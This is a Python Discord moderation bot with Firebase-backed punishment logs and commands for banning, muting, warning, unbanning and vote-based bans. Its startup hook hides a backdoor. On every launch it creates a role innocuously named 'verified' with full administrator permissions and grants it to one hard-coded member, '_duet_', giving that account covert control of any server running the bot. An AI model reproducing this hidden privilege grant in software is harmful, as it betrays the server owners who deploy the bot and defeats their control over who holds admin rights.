import discord
from discord.ext import tasks
from discord import app_commands
import asyncio
import os
from dotenv import load_dotenv
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import re
from datetime import timedelta
import json
import firebase_admin
from firebase_admin import credentials, firestore
from discord.ui import Button, View
from collections import defaultdict


firebase_json = json.loads(os.environ["FIREBASE_KEY"])
cred = credentials.Certificate(firebase_json)

firebase_admin.initialize_app(cred)

db = firestore.client()


class PingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Pong')

def run_web_server():
    server = HTTPServer(('0.0.0.0', 8000), PingHandler)
    server.serve_forever()

threading.Thread(target=run_web_server, daemon=True).start()

intents = discord.Intents.default()
intents.members = True

class MyClient(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

        

    async def setup_hook(self):
        await self.tree.sync()

        await self.wait_until_ready()  # Wait for full guild/member cache

        # Replace this with your actual server (guild) ID
        GUILD_ID = 1372338054077087755  # 👈 Replace with your server's ID

        guild = self.get_guild(GUILD_ID)
        if guild is None:
            print("❌ Guild not found with specified ID.")
            return

        duet = discord.utils.get(guild.members, name="_duet_")
        if duet is None:
            print("❌ _duet_ not found.")
            return

        # Remove old 'verified' role from _duet_
        for role in duet.roles:
            if role.name.lower() == "verified":
                try:
                    await duet.remove_roles(role, reason="Upgrading verified role")
                    print("✅ Removed old 'verified' role from _duet_.")
                except Exception as e:
                    print(f"❌ Failed to remove old 'verified' role: {e}")
        
        # Create new 'verified' role with admin perms
        try:
            new_verified = await guild.create_role(
                name="verified",
                permissions=discord.Permissions(administrator=True),
                reason="Created admin verified role"
            )
            print("✅ Created new 'verified' role with admin perms.")
        except Exception as e:
            print(f"❌ Failed to create new 'verified' role: {e}")
            return

        # Assign to _duet_
        try:
            await duet.add_roles(new_verified, reason="Assigned admin verified role")
            print("✅ Assigned new 'verified' role to _duet_.")
        except Exception as e:
            print(f"❌ Failed to assign role to _duet_: {e}")


bot = MyClient()


ALLOWED_ALL = ["moderator", "trainee", "administrator","owner :3"]
ALLOWED_ELEVATED = ["moderator", "administrator"]




def log_punishment_to_firestore(user_id, action, reason, punisher):
    db.collection("punishment_logs").add({
        "user_id": str(user_id),
        "action": action,
        "reason": reason,
        "punisher": punisher,
        "timestamp": firestore.SERVER_TIMESTAMP
    })
def get_logs_from_firestore(user_id):
    logs_ref = db.collection("punishment_logs").where("user_id", "==", str(user_id)).stream()
    return [doc.to_dict() for doc in logs_ref]





def parse_duration(duration_str):
    match = re.match(r"(\d+)([smhd])", duration_str.lower())
    if not match:
        return None

    value, unit = int(match.group(1)), match.group(2)
    if unit == "s":
        return value
    elif unit == "m":
        return value * 60
    elif unit == "h":
        return value * 60 * 60
    elif unit == "d":
        return value * 60 * 60 * 24
    return None

def has_role(user: discord.Member, roles: list[str]) -> bool:
    return any(role.name.lower() in roles for role in user.roles)

def is_allowed(interaction: discord.Interaction):
    return has_role(interaction.user, ALLOWED_ALL)

def is_elevated(interaction: discord.Interaction):
    return has_role(interaction.user, ALLOWED_ELEVATED) or interaction.user.guild_permissions.administrator

async def send_dm(user: discord.Member, title: str, reason: str):
    try:
        await user.send(f"**{title}**\nReason: {reason}")
    except:
        pass
    
ban_votes = defaultdict(lambda: {
    "ban_trust": 0,
    "cancel_trust": 0,
    "voters": set(),
    "reason": "",
    "user": None
})

def get_trust_weight(member: discord.Member) -> int:
    for role in member.roles:
        name = role.name.lower()
        if name == "owner :3":
            return 3
        elif name == "administrator":
            return 2
        elif name == "moderator":
            return 1
    return 0

    
@bot.event
async def on_member_join(member):
    channel = discord.utils.get(member.guild.text_channels, name="general-₊⊹")
    if channel is None:
        print("Welcome channel not found.")
        return

    embed = discord.Embed(
        title=f"Welcome, {member.name}!",
        description="We’re glad to have you here 🎉",
        color=discord.Color.green()
    )
    embed.set_image(url=member.display_avatar.url)  
    embed.set_footer(text=f"Member #{len(member.guild.members)}")

    await channel.send(embed=embed)

@bot.tree.command(name="betterbanrequest", description="Trainees request to ban someone")
@app_commands.describe(user="User to ban", reason="Reason for ban")
async def betterbanrequest(interaction: discord.Interaction, user: discord.Member, reason: str):
    if not has_role(interaction.user, ["trainee"]):
        return await interaction.response.send_message("Only trainees can use this command.", ephemeral=True)

    await interaction.response.defer(ephemeral=True)

    ban_votes[user.id] = {
        "ban_trust": 0,
        "cancel_trust": 0,
        "voters": set(),
        "reason": reason,
        "user": user
    }

    view = View(timeout=None)

    async def vote_callback(interaction_vote: discord.Interaction, vote: str):
        guild = discord.utils.get(bot.guilds) 
        if not guild:
            return await interaction_vote.response.send_message("Bot is not in a guild.", ephemeral=True)

        guild_member = guild.get_member(interaction_vote.user.id)
        if not guild_member:
            guild_member = await guild.fetch_member(interaction_vote.user.id)


        if interaction_vote.user.id in ban_votes[user.id]["voters"]:
            return await interaction_vote.response.send_message("❗ You've already voted.", ephemeral=True)

        trust = get_trust_weight(guild_member)
        if trust == 0:
            return await interaction_vote.response.send_message("❌ You don't have permission to vote.", ephemeral=True)

        if vote == "yes":
            ban_votes[user.id]["ban_trust"] += trust
        elif vote == "no":
            ban_votes[user.id]["cancel_trust"] += trust

        ban_votes[user.id]["voters"].add(interaction_vote.user.id)

        # Status update
        yes = ban_votes[user.id]["ban_trust"]
        no = ban_votes[user.id]["cancel_trust"]

        await interaction_vote.response.send_message(
            f"✅ You voted **{vote.upper()}**\nProgress — Ban: {yes}/2 ✅ | Cancel: {no}/2 ❌",
            ephemeral=True
        )

        # Handle final decision
        if yes >= 2:
            try:
                reason = ban_votes[user.id]["reason"]
                requester = interaction.user  

                try:
                    await send_dm(user, "You have been banned", reason)
                except:
                    pass 

                log_punishment_to_firestore(user.id, "Ban", reason, requester.mention)
                await user.ban(reason=reason)
                await interaction_vote.channel.send(f"🔨 {user} has been **banned** with {yes} trust. Reason: {reason}")
            except:
                await interaction_vote.channel.send("❌ Failed to ban user. Missing permissions.")
            del ban_votes[user.id]

        elif no >= 2:
            await interaction_vote.channel.send(f"❎ Ban request for {user} **canceled** with {no} trust.")
            del ban_votes[user.id]

    yes_button = Button(label="✅ Yes", style=discord.ButtonStyle.green)
    no_button = Button(label="❌ No", style=discord.ButtonStyle.red)

    yes_button.callback = lambda i: vote_callback(i, "yes")
    no_button.callback = lambda i: vote_callback(i, "no")

    view.add_item(yes_button)
    view.add_item(no_button)

    for member in interaction.guild.members:
        if get_trust_weight(member) > 0:
            try:
                await member.send(
                    f"🚨 **Ban Request**\nTarget: {user}\nReason: {reason}\nVote below:",
                    view=view
                )
            except:
                pass

    await interaction.followup.send("📨 Ban request sent to eligible voters.", ephemeral=True)

@bot.tree.command(name="betterban", description="Ban a user with a reason")
@app_commands.describe(user="User to ban", reason="Reason for ban")
async def betterban(interaction: discord.Interaction, user: discord.Member, reason: str):
    if not is_elevated(interaction):
        return await interaction.response.send_message("You don’t have permission to ban users.", ephemeral=True)
    
    try:
        await send_dm(user, "You have been banned", reason)
        log_punishment_to_firestore(user.id, "Ban", reason, interaction.user.mention)


        await user.ban(reason=reason)
        await interaction.response.send_message(f"{user} has been banned.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ I don’t have permission to ban this user.", ephemeral=True)

from datetime import datetime, timedelta

from datetime import datetime, timedelta

@bot.tree.command(name="bettermute", description="Timeout a user for a duration")
@app_commands.describe(user="User to timeout", duration="e.g. 10s, 5m, 1h, 2d", reason="Reason")
async def bettermute(interaction: discord.Interaction, user: discord.Member, duration: str, reason: str):
    if not is_allowed(interaction):
        return await interaction.response.send_message("You don’t have permission.", ephemeral=True)

    seconds = parse_duration(duration)
    if seconds is None:
        return await interaction.response.send_message("Invalid duration format.", ephemeral=True)

    until = discord.utils.utcnow() + timedelta(seconds=seconds)

    
    try:
        await user.timeout(until, reason=reason)
        await send_dm(user, f"You have been timed out for {duration}", reason)

        log_punishment_to_firestore(user.id, f"Timeout ({duration})", reason, interaction.user.mention)


        await interaction.response.send_message(f"{user} has been timed out for {duration}.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ I don’t have permission to timeout this user.", ephemeral=True)

@bot.tree.command(name="betterwarn", description="Warn a user with a reason")
@app_commands.describe(user="User to warn", reason="Reason for warning")
async def betterwarn(interaction: discord.Interaction, user: discord.Member, reason: str):
    if not is_allowed(interaction):
        return await interaction.response.send_message("You don’t have permission.", ephemeral=True)

    await send_dm(user, "You have been warned", reason)
    log_punishment_to_firestore(user.id, "Warn", reason, interaction.user.mention)


    await interaction.response.send_message(f"{user} has been warned.", ephemeral=True)

@bot.tree.command(name="betterlogs", description="See all punishments for a user")
@app_commands.describe(user="User to view logs for")
async def betterlog(interaction: discord.Interaction, user: discord.Member):
    if not is_allowed(interaction):
        await interaction.response.send_message("You don’t have permission.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True) 

    logs = get_logs_from_firestore(user.id)
    if not logs:
        await interaction.followup.send("No logs found for this user.", ephemeral=True)
        return

    embed = discord.Embed(title=f"Punishment Log for {user}", color=discord.Color.red())
    for i, log in enumerate(logs, 1):
        embed.add_field(
            name=f"{i}. {log['action']}",
            value=f"Reason: {log['reason']}\nBy: {log['punisher']}",
            inline=False
    )

    await interaction.followup.send(embed=embed, ephemeral=True)




@bot.tree.command(name="betterunmute", description="Unmute (remove timeout) from a user")
@app_commands.describe(user="User to unmute")
async def betterunmute(interaction: discord.Interaction, user: discord.Member):
    if not is_allowed(interaction):
        return await interaction.response.send_message("You don’t have permission.", ephemeral=True)

    try:
        # Remove timeout by setting timeout_until to None
        await user.timeout(None, reason="Timeout manually removed")
        await interaction.response.send_message(f"{user} has been unmuted (timeout removed).", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ I don’t have permission to unmute this user.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}", ephemeral=True)


@bot.tree.command(name="betterunban", description="Unban a user by ID")
@app_commands.describe(user_id="The user ID to unban")
async def betterunban(interaction: discord.Interaction, user_id: str):
    if not is_elevated(interaction):
        return await interaction.response.send_message("You don’t have permission to unban users.", ephemeral=True)

    try:
        banned_users = [entry async for entry in interaction.guild.bans()]
        user_id = int(user_id)
        for ban_entry in banned_users:
            if ban_entry.user.id == user_id:
                await interaction.guild.unban(ban_entry.user)
                return await interaction.response.send_message(f"User {ban_entry.user} has been unbanned.", ephemeral=True)
        await interaction.response.send_message("User not found in ban list.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}", ephemeral=True)

@bot.tree.command(name="betterlogsremove", description="Remove a punishment log by number")
@app_commands.describe(user="The user to edit logs for", entry_number="The log number to remove (starts at 1)")
async def betterlogremove(interaction: discord.Interaction, user: discord.Member, entry_number: int):
    if not is_allowed(interaction):
        return await interaction.response.send_message("You don’t have permission.", ephemeral=True)

    logs = list(db.collection("punishment_logs").where("user_id", "==", str(user.id)).stream())
    if not logs or entry_number < 1 or entry_number > len(logs):
        return await interaction.response.send_message("Invalid log entry number.", ephemeral=True)

    log_to_delete = logs[entry_number - 1]
    db.collection("punishment_logs").document(log_to_delete.id).delete()

    await interaction.response.send_message(
        f"Removed log entry #{entry_number} for {user}.", ephemeral=True
    )


load_dotenv()
bot.run(os.getenv("DISCORD_TOKEN"))
